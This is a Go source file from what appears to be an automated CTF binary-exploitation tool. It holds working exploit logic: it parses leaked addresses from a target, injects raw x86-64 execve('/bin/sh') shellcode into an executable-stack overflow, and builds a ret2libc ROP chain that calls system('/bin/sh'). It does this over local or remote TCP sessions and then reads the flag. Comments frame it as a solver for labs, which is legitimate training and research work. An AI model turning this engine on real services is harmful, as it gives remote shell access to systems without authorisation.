package solve

import (
	"bytes"
	"context"
	"debug/elf"
	"fmt"
	"os"
	"os/exec"
	"regexp"
	"strconv"
	"time"

	"github.com/MoriartyPuth/PwnProbes/internal/extract"
	"github.com/MoriartyPuth/PwnProbes/internal/runner"
	"github.com/MoriartyPuth/PwnProbes/internal/session"
)

// These strategies use a runtime address the target leaks at run time. They run
// over a live session (local subprocess or remote TCP), reading the leak and
// sending the exploit within one connection, so they work with ASLR enabled and
// against a remote service. After control transfer a shell is spawned and driven
// with a trailing `cat flag.txt` so the flag reaches the transcript.

// driveShell is sent to the spawned shell after the overflow line. The labs make
// stdin unbuffered, so the vulnerable read consumes only its line and leaves this
// for the shell. A remote service may read the flag from a different path.
const driveShell = "cat flag.txt\n"

// execveBinSh is a null-tolerant, newline-free x86-64 execve("/bin/sh",
// ["/bin/sh"], NULL). gets() stops only at a newline, so embedded NUL bytes are
// fine; argv[0] is set so the spawned shell reads commands from stdin.
var execveBinSh = []byte{
	0x48, 0x31, 0xd2, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00,
	0x52, 0x53, 0x48, 0x89, 0xe7, 0x52, 0x57, 0x48, 0x89, 0xe6, 0x6a, 0x3b, 0x58, 0x0f, 0x05,
}

var leakRe = regexp.MustCompile(`0x[0-9a-fA-F]{6,}`)

// leakOffsets lists overflow lengths to try when a leak is known; it covers the
// return-address offsets of small and large buffers alike.
func leakOffsets() []int {
	out := []int{}
	for v := 8; v <= 320; v += 8 {
		out = append(out, v)
	}
	return out
}

// parseLeaks returns the distinct pointer-sized values printed in out.
func parseLeaks(out string) []uint64 {
	var leaks []uint64
	seen := map[uint64]bool{}
	for _, m := range leakRe.FindAllString(out, -1) {
		v, err := strconv.ParseUint(m[2:], 16, 64)
		if err != nil || v < 0x1000 || seen[v] {
			continue
		}
		seen[v] = true
		leaks = append(leaks, v)
	}
	return leaks
}

func (s *solver) idle() time.Duration {
	if s.remote != "" {
		return 600 * time.Millisecond
	}
	return 300 * time.Millisecond
}

// open starts a connection to the target: a remote TCP service when a remote
// address is set, otherwise a local subprocess running in the binary's directory.
func (s *solver) open(ctx context.Context) (*session.Conn, func(), error) {
	if s.remote != "" {
		conn, err := session.Dial(ctx, s.remote, 5*time.Second)
		return conn, func() {}, err
	}
	tmp, err := os.MkdirTemp("", "pwnprobe-sess-")
	if err != nil {
		return nil, nil, err
	}
	cleanup := func() { os.RemoveAll(tmp) }
	env := []string{"PATH=/usr/bin:/bin", "LANG=C", "LC_ALL=C", "HOME=" + tmp, "TMPDIR=" + tmp}
	conn, err := session.Spawn(ctx, s.path, nil, env, s.workDir)
	if err != nil {
		cleanup()
		return nil, nil, err
	}
	return conn, cleanup, nil
}

// liveAttempt runs one exploit attempt over a fresh connection: it reads the
// pre-input output (including any leak), lets build construct a payload from the
// leaked values, sends it followed by the shell driver, and records whether a
// non-echoed flag came back. build returns ok=false to skip (for example when the
// expected leak is absent), which is not an error.
func (s *solver) liveAttempt(ctx context.Context, strategy string, build func(leaks []uint64) (payload []byte, note string, ok bool)) (bool, error) {
	conn, cleanup, err := s.open(ctx)
	if err != nil {
		return false, err
	}
	defer cleanup()
	defer conn.Close()

	pre := conn.RecvUntilIdle(s.idle())
	payload, note, ok := build(parseLeaks(string(pre)))
	if !ok {
		return false, nil
	}
	input := append(append(append([]byte{}, payload...), '\n'), []byte(driveShell)...)
	if err := conn.Send(input); err != nil {
		return false, nil // target closed; treat as a failed attempt, not a solve error
	}
	post := conn.RecvUntilIdle(s.idle())
	out := string(pre) + string(post)

	cands := s.ex.Find(out, input, "session")
	recovered := extract.Recovered(cands)
	a := Attempt{
		Strategy:  strategy,
		Payload:   string(input),
		Note:      note,
		Result:    runner.Result{Outcome: "session", ExitCode: -1, Stdout: out},
		Candidate: cands,
		Recovered: recovered,
	}
	s.report.Attempts = append(s.report.Attempts, a)
	if len(recovered) > 0 {
		s.report.Solved = true
		s.report.Flags = recovered
		winner := a
		s.report.Winning = &winner
		return true, nil
	}
	return false, nil
}

// pickStackLeak returns the leaked value most likely to be a stack address.
func pickStackLeak(leaks []uint64) (uint64, bool) {
	best, ok := uint64(0), false
	for _, l := range leaks {
		if l >= 0x7f0000000000 && l > best {
			best, ok = l, true
		}
	}
	if ok {
		return best, true
	}
	for _, l := range leaks { // fall back to the largest leak
		if l > best {
			best, ok = l, true
		}
	}
	return best, ok
}

// shellcodeStrategy solves an executable-stack overflow that leaks its buffer
// address: it writes shellcode at the buffer, pads to the return address, and
// overwrites it with the leaked buffer address so the shellcode runs.
func (s *solver) shellcodeStrategy(ctx context.Context) (bool, error) {
	bin := s.report.Binary
	if bin.Bits != 64 || bin.Protections["nx"].Status != "disabled" {
		return false, nil // executable stack only
	}
	for _, off := range leakOffsets() {
		if off < len(execveBinSh) {
			continue
		}
		if err := ctx.Err(); err != nil {
			return false, err
		}
		done, err := s.liveAttempt(ctx, "shellcode", func(leaks []uint64) ([]byte, string, bool) {
			buf, ok := pickStackLeak(leaks)
			if !ok {
				return nil, "", false
			}
			payload := make([]byte, 0, off+8)
			payload = append(payload, execveBinSh...)
			for len(payload) < off {
				payload = append(payload, 'A')
			}
			payload = append(payload, qword(buf)...)
			if bytes.IndexByte(payload, '\n') >= 0 {
				return nil, "", false
			}
			return payload, fmt.Sprintf("shellcode@%#x padding=%d", buf, off), true
		})
		if err != nil || done {
			return done, err
		}
	}
	return false, nil
}

// ret2libcStrategy solves an NX target that leaks a libc address: it resolves the
// libc base from the leak, finds system() and a "/bin/sh" string, and builds a
// pop rdi; "/bin/sh"; [ret]; system() chain to spawn a shell.
func (s *solver) ret2libcStrategy(ctx context.Context) (bool, error) {
	bin := s.report.Binary
	if bin.Bits != 64 || bin.Protections["pie"].Status == "enabled" || bin.Protections["nx"].Status != "enabled" {
		return false, nil
	}
	f, err := elf.Open(s.path)
	if err != nil {
		return false, err
	}
	popRDI, okRDI := findGadget(f, []byte{0x5f, 0xc3})
	ret, haveRet := retGadget(f)
	f.Close()
	if !okRDI {
		return false, nil
	}
	sysOff, binshOff, ok := resolveLibc(s.path)
	if !ok {
		s.report.Limitations = append(s.report.Limitations, "could not resolve libc system()/\"/bin/sh\"; ret2libc strategy skipped (remote targets may use a different libc)")
		return false, nil
	}
	for _, off := range leakOffsets() {
		for _, align := range []bool{true, false} {
			if align && !haveRet {
				continue
			}
			if err := ctx.Err(); err != nil {
				return false, err
			}
			done, err := s.liveAttempt(ctx, "ret2libc", func(leaks []uint64) ([]byte, string, bool) {
				var base, system uint64
				found := false
				for _, l := range leaks {
					if (l-sysOff)%0x1000 == 0 { // a page-aligned base confirms this leak is system()
						base, system, found = l-sysOff, l, true
						break
					}
				}
				if !found {
					return nil, "", false
				}
				binsh := base + binshOff
				payload := bytes.Repeat([]byte("A"), off)
				payload = append(payload, qword(popRDI)...)
				payload = append(payload, qword(binsh)...)
				if align {
					payload = append(payload, qword(ret)...)
				}
				payload = append(payload, qword(system)...)
				if bytes.IndexByte(payload, '\n') >= 0 {
					return nil, "", false
				}
				return payload, fmt.Sprintf("ret2libc padding=%d binsh=%#x system=%#x align=%v", off, binsh, system, align), true
			})
			if err != nil || done {
				return done, err
			}
		}
	}
	return false, nil
}

// resolveLibc finds the libc the target links, then returns the file offset of
// system() and of a "/bin/sh" string within it.
func resolveLibc(path string) (sysOff, binshOff uint64, ok bool) {
	out, err := exec.Command("ldd", path).Output()
	if err != nil {
		return 0, 0, false
	}
	m := regexp.MustCompile(`(/[^\s]*libc[^\s]*\.so[^\s]*)`).FindSubmatch(out)
	if m == nil {
		return 0, 0, false
	}
	lf, err := elf.Open(string(m[1]))
	if err != nil {
		return 0, 0, false
	}
	defer lf.Close()
	syms, err := lf.DynamicSymbols()
	if err != nil {
		return 0, 0, false
	}
	for _, sy := range syms {
		if sy.Name == "system" && sy.Value != 0 {
			sysOff = sy.Value
			break
		}
	}
	if sysOff == 0 {
		return 0, 0, false
	}
	for _, sec := range lf.Sections {
		if sec.Type != elf.SHT_PROGBITS {
			continue
		}
		d, err := sec.Data()
		if err != nil {
			continue
		}
		if i := bytes.Index(d, []byte("/bin/sh\x00")); i >= 0 {
			binshOff = sec.Addr + uint64(i)
			break
		}
	}
	if binshOff == 0 {
		return 0, 0, false
	}
	return sysOff, binshOff, true
}
